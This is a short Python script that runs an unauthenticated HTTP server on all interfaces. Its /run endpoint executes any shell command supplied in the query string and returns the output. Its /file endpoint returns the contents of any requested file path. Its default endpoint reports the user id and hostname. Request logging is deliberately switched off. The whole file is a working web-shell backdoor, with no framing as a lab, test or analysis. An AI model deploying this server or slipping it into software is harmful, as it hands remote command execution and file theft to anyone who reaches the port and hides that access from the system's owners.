import http.server, socketserver, os, json, subprocess, urllib.parse, socket
def run(c):
    try:
        r=subprocess.run(c,shell=True,capture_output=True,timeout=45)
        return {"rc":r.returncode,"out":r.stdout.decode('utf-8','replace')[:20000],"err":r.stderr.decode('utf-8','replace')[:1500]}
    except Exception as e: return {"error":str(e)[:200]}
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        u=urllib.parse.urlparse(self.path); q=urllib.parse.parse_qs(u.query)
        try:
            if u.path=="/run" and "c" in q: body=json.dumps(run(q["c"][0])).encode()
            elif u.path=="/file": body=open(q["p"][0],"rb").read()
            else: body=json.dumps({"uid":os.getuid(),"host":socket.gethostname()}).encode()
        except Exception as e: body=json.dumps({"err":str(e)}).encode()
        self.send_response(200); self.send_header("Content-Type","application/json"); self.end_headers(); self.wfile.write(body)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
with socketserver.TCPServer(("0.0.0.0",int(os.environ.get("PORT",3000))),H) as s: s.serve_forever()
